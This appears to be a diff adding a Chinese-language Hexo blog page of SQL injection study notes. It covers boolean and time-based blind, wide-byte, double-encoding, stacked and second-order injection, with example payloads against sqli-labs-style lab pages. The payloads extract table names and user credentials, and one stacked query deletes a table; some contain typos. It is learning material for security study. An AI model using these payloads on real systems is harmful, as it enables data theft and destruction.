@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        Hexo
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.1"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            SQL注入笔记（1）
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <h3 id="SQL注入笔记（1）"><a href="#SQL注入笔记（1）" class="headerlink" title="SQL注入笔记（1）"></a>SQL注入笔记（1）</h3><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><h5 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h5><p>（一）（截取数据库某一字段的一部分）</p>
+<ul>
+<li>substr(arg1,int1,int2)    <em>从1开始</em></li>
+<li>subsring()</li>
+<li>mid()</li>
+</ul>
+<p>（二）</p>
+<ul>
+<li><p>length(arg1)      返回字符串的长度</p>
+<p>(三)</p>
+</li>
+<li><p>ascii(str)          返回子符的ascii()码</p>
+</li>
+</ul>
+<p>( 四)</p>
+<ul>
+<li>if(arg1,arg2,arg3)    判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</li>
+</ul>
+<h5 id="ascii"><a href="#ascii" class="headerlink" title="ascii()"></a>ascii()</h5><ul>
+<li>查看数据库名的长度：</li>
+</ul>
+<p>​             45.32.113.109:13453/Less-1/</p>
+<p>​             ?id=1’ and length(database())=8–+</p>
+<ul>
+<li>查看数据库第四个子符的ascii码：</li>
+</ul>
+<p>​             45.32.113.109:13453/Less-1/</p>
+<p>​             ?id=1’ and ascii(substr(database(),4,4))=117–+</p>
+<ul>
+<li><p>获取数据库表名</p>
+<ul>
+<li><p>获取表的个数；</p>
+<p>45.32.113.109:13453/Less-8/<br>?id=1’ and (select count(*) from information_schema.tables where table_schema=database())=4–+</p>
+</li>
+<li><p>表名长度：</p>
+<p>45.32.113.109:13453/Less-8/<br>?id=1’ and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=6–+</p>
+</li>
+<li><p>表名</p>
+<p>45.32.113.109:13453/Less-8/<br>?id=1’ and ascii((substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),0,1)))=101 –+</p>
+</li>
+<li><p>列名（个数-&gt;长度-&gt;列名）</p>
+<p>45.32.113.109:13453/Less-8/<br>?id=1’ and ascii((substr((select column_name from information_schema.columns where table_name=’users’ limit 0,1),0,1)))=101 –+</p>
+</li>
+<li><p>获得数据</p>
+<p>45.32.113.109:13453/Less-8/<br>?id=1’ and ascii(substr((select group_concat(username,0x7e,password) from users limit 0,1),1,1))=68 –+</p>
+</li>
+<li><p>表的整体的长度</p>
+<p>45.32.113.109:13453/Less-8/<br>?id=1’ and (select length(group_concat(table_name)) from information_schema.tables where table_schema=database())=29 –+</p>
+</li>
+<li><p>获取列名</p>
+<p>45.32.113.109:13453/Less-8/<br>?id=1’ and (ascii(substr(select distinct column_name from information_schema.columns where table_name=users and table_schema=database() limit 0,1),1,1))&gt;2 –+</p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h4><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><h5 id="常用的SQL函数"><a href="#常用的SQL函数" class="headerlink" title="常用的SQL函数"></a>常用的SQL函数</h5><ul>
+<li>sleep()<ul>
+<li>说明：sleep(int1）用来捕获到执行迅速不易被查看到的语句以确定我们的程序是否确实在服务器端发起了该语句，int1是中断的时间，单位是秒。</li>
+<li>语句：select if(1=1, sleep(3), ‘goodbye)</li>
+<li>结果：1=1成立，延时三秒</li>
+</ul>
+</li>
+<li>benchmark()<ul>
+<li>说明：benchmark(arg1,arg2)用来测试一些函数的执行速度。arg1是执行的次数，arg2是要执行的或者函数是表达式。与sleep()函数基本一样，但是当sleep()不能使用时，可以使用benchmark()函数</li>
+<li>语句：select if(1 =1, benchmark(5000000,md5(‘abc’)), ‘goodbye’)</li>
+<li>结果：1=1成立，页面延迟x秒显示，根据机器性能不同，执行时间不同</li>
+</ul>
+</li>
+</ul>
+<h5 id="获取数据库内容的基本过程"><a href="#获取数据库内容的基本过程" class="headerlink" title="获取数据库内容的基本过程"></a>获取数据库内容的基本过程</h5><ul>
+<li><p>获得数据库名的长度</p>
+<p>45.32.113.109:50154/Less-9/<br>?id=1’ and if((length(database())&gt;10),sleep(5),1)–+</p>
+<p>通过<img src="C:\Users\86131\AppData\Roaming\Typora\typora-user-images\image-20220328145557480.png" alt="image-20220328145557480">（网络)查看</p>
+</li>
+<li><p>获得数据库名</p>
+<p>45.32.113.109:50154/Less-9/<br>?id=1’ and if((ascii(substr(database(),1,1))=s”a”),sleep(5),1)–+</p>
+</li>
+<li><p>获取数据库表名</p>
+<p>and if((ascii(substr((select table_name from information_schema.tables where table_schema=database () limit 0,1),1,1)))&gt;100,sleep(5),1)–+</p>
+</li>
+<li><p>获取数据库名</p>
+<p>and if((asci(substr((select column name from information schema.columns where table name=’users’ limit 0,1),1,1)))&gt;100,sleep(5),1)–+</p>
+</li>
+<li><p>获取数据</p>
+<p>and if((ascii(substr(( select 列名from 表名 limit 0,1),1,1))=97,sleep(5),1)–+</p>
+</li>
+</ul>
+<h4 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h4><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><ul>
+<li><p>什么是宽字节</p>
+<p>宽字节是指两个字节宽度的编码技术</p>
+</li>
+<li><p>造成宽字节注入的原因</p>
+<p>宽字节注入是利用mysal的一个特性，mysal在使用GBK编码的时候，会认为两个字符是一个汉字</p>
+</li>
+<li><p>GBK编码原理</p>
+<ul>
+<li>—个字符占1个字节，两个字节以上叫宽字节</li>
+<li>设置”set character set client=gbk”（gbk编码设置），通常导致编码转换的注入问题，尤其是使用php连接mysal数据库的时候</li>
+<li>—个gbk汉宇占两个字节，取值范围是（编码位数）：第一个字节为129-254，第二个字节为64-254</li>
+<li>当设置gbk编码后，遇到连续两个字节，都符合gbk取值范围 ，会自动解析为一个汉字</li>
+</ul>
+</li>
+</ul>
+<h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><h5 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h5><p>在注入点后键入%df，然后按照正常的注入流程开始注入</p>
+<p>注意：前一个字符的Ascii要大于128，两个字符才能组组成汉字</p>
+<h5 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h5><ul>
+<li>查看MySql编码是否为GBK格式</li>
+<li>是否使用了 preg_replace()把单引号替换成&#39;</li>
+<li>是否使用了addslashes()函数进行转义</li>
+<li>是否使用了 mysql_ real_escape_ string()函数进行转义</li>
+</ul>
+<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><h5 id="实验一：使用mysql-query-addslashes0函数，存在宽字节注入"><a href="#实验一：使用mysql-query-addslashes0函数，存在宽字节注入" class="headerlink" title="实验一：使用mysql_query + addslashes0函数，存在宽字节注入"></a>实验一：使用mysql_query + addslashes0函数，存在宽字节注入</h5><ul>
+<li>设置编码方式：mysql_query(“SET NAMES ‘gbk’”)</li>
+<li>过滤函数：addslashes()函数</li>
+<li>测试语句：mysal-query_add.php?id =1%df’ order by 3%23</li>
+</ul>
+<h5 id="实验二：使用-mysql-query-real-escape-string0函数，存在宽字节注入"><a href="#实验二：使用-mysql-query-real-escape-string0函数，存在宽字节注入" class="headerlink" title="实验二：使用 mysql_query + real escape string0函数，存在宽字节注入"></a>实验二：使用 mysql_query + real escape string0函数，存在宽字节注入</h5><ul>
+<li>设置编码方式：mysql_query(“SET NAMES ‘gbk’”)</li>
+<li>过滤函数：real_escape_string()函数</li>
+<li>测试语句：mysql-query_ real.php?id=1%df’ order by 3%23</li>
+</ul>
+<h5 id="实验三：使用-mysql-set-charset-addslashes-函数，存在宽字节注入"><a href="#实验三：使用-mysql-set-charset-addslashes-函数，存在宽字节注入" class="headerlink" title="实验三：使用 mysql_set_charset + addslashes()函数，存在宽字节注入"></a>实验三：使用 mysql_set_charset + addslashes()函数，存在宽字节注入</h5><ul>
+<li>设置编码方式：mysql_set_charset(“gbk”)</li>
+<li>过滤函数：addslashes()函数</li>
+<li>测试语句：mysql_set_charset_add.php?id =1%df’ order by 3%23</li>
+</ul>
+<h5 id="实验四：使用-mysal-set-charset-mysql-real-escape-string-）函数，不存在宽字节注入"><a href="#实验四：使用-mysal-set-charset-mysql-real-escape-string-）函数，不存在宽字节注入" class="headerlink" title="实验四：使用 mysal_set_charset + mysql_real_escape_string(）函数，不存在宽字节注入"></a>实验四：使用 mysal_set_charset + mysql_real_escape_string(）函数，不存在宽字节注入</h5><ul>
+<li>设置编码方式：mysql_set_charset(“gbk”)</li>
+<li>过滤函数：mysql_real_escape_string()函数</li>
+<li>测试语句：/mysql_set_charset_real.php?id =1%df’ order by 100 %23</li>
+</ul>
+<h5 id="实验五：修复-mysql-query-addslashes-mysql-real-escape-string0，存在宽字节注入的问题"><a href="#实验五：修复-mysql-query-addslashes-mysql-real-escape-string0，存在宽字节注入的问题" class="headerlink" title="实验五：修复 mysql_query + addslashes()/mysql_real_ escape._string0，存在宽字节注入的问题"></a>实验五：修复 mysql_query + addslashes()/mysql_real_ escape._string0，存在宽字节注入的问题</h5><ul>
+<li>设置编码方式：Mysql_query(“SET character_set_connection=gbk.character_set_result=gbk,character_set_client=binary” ,$conn)</li>
+<li>过滤函数：mysql_real_escape_string() / addslashes() 函数</li>
+<li>测试语句：/mysql_set_charset_real.php?id =1%df’ order by 100 %23</li>
+</ul>
+<h3 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h3><h3 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h3><h4 id="URL编码形式："><a href="#URL编码形式：" class="headerlink" title="URL编码形式："></a>URL编码形式：</h4><p>URL采用ASCII编码，则其他非ASCII字符（如中文等）将无法表示 ，需要进行编码；RFC3986文档规定了允许出现在URL中的所有可打印字符：</p>
+<ul>
+<li>英文字符 (a-zA-Z)</li>
+<li>数字(0-9）</li>
+<li>4个特殊字符-_.~</li>
+<li>保留字符：!*();:@＆=+$,/?#[]</li>
+</ul>
+<p>URL编码也被称为百分号编码，使用百分号％接两个十六进制字符代表一个字节。推荐使用UTF-8编码字符后再对每个字节添加百分号处理</p>
+<h4 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h4><h5 id="相关函数："><a href="#相关函数：" class="headerlink" title="相关函数："></a>相关函数：</h5><p>urldecode(), rawurldecode()</p>
+<h5 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h5><ul>
+<li>因为PHP中常用的防注入的函数addslashes()，原理是给（’)、（ “）、（\）和NULL等特殊字符前面加上反斜杠以用于转义，但是这些函数在遇到urldecode()或rawurldecode ()函数时，会因为二次解码引发注入生成单引号，引发注入漏洞的产生。</li>
+<li>urldecode()函数是对已编码的URL进行解码，但是PHP会在处理提交的数据之前先进行一次解码，因此造成了二次编码注入。</li>
+</ul>
+<h4 id="转义单引号，二次编码注入"><a href="#转义单引号，二次编码注入" class="headerlink" title="转义单引号，二次编码注入"></a>转义单引号，二次编码注入</h4><h5 id="正常注入，注入出有效信息"><a href="#正常注入，注入出有效信息" class="headerlink" title="正常注入，注入出有效信息"></a>正常注入，注入出有效信息</h5><p>语句：?id=-1%2527 union select 1,user(),3%23</p>
+<h5 id="不转义，二次编码注入"><a href="#不转义，二次编码注入" class="headerlink" title="不转义，二次编码注入"></a>不转义，二次编码注入</h5><ul>
+<li>输入单引号，因为没有转义，所以直接报错</li>
+<li>使用注释符，闭合单引号，直接注入出有效信息</li>
+</ul>
+<h3 id="Base64注入"><a href="#Base64注入" class="headerlink" title="Base64注入"></a>Base64注入</h3><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><h5 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h5><p>什么是堆叠注入？</p>
+<p>在SQL语句中 ，分号(；)用来表示一条sql语句的结束。所以可以在以分号(；)结束一个sql语句后，继续构造一下条语句，可以一起执行。</p>
+<p>堆叠查询和联合查询的区别?</p>
+<ul>
+<li>联合查询：union 或者union all 执行的语句类型有限，可以用来执<br>行查询语句</li>
+<li>堆叠查询：堆叠查询可以执行的是任意的语句<ul>
+<li>如用户输入：<br>Select * from products where pro=1;DELETE FROM products<br>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除</li>
+</ul>
+</li>
+</ul>
+<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>堆叠注入，就是将许多sql语句叠加在一起执行。将原来的语句构造完成后加上分号，代表该语向结束，后面再输入的就是一个全新的sql语句 ，这时我们使用的语句将毫无限制。</p>
+<p> 如：[1‘ ;show tables();＃]</p>
+<h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
+<li>可能受到API或者数据库引擎不支持的限制</li>
+<li>权限不足，可能导致无法修改数据或者调用一些程序</li>
+</ul>
+<h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><ul>
+<li>由于在web系统中，代码通常只返回一个查询结果，所以在读取数据时，建议使用联合注入</li>
+<li>使用堆叠注入之前，需要知道数据库的相关信息，如表名，列名等。</li>
+</ul>
+<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><h4 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h4><h5 id="什么是二次注入"><a href="#什么是二次注入" class="headerlink" title="什么是二次注入"></a>什么是二次注入</h5><p>简单的说，二次注入是指已存储(数据库、文件）的用户输入被读取后，再次进入到 SQL 查询语句中导致的注入。</p>
+<h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><ul>
+<li>有些网站当用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入</li>
+<li>注意：可能每一次注入都不构成漏洞，但是如果一起用就可能造成注入。</li>
+</ul>
+
+    </div>
+
+    
+        <hr class="fhr">
+        <div id="vcomments"></div>
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+        <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label>
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
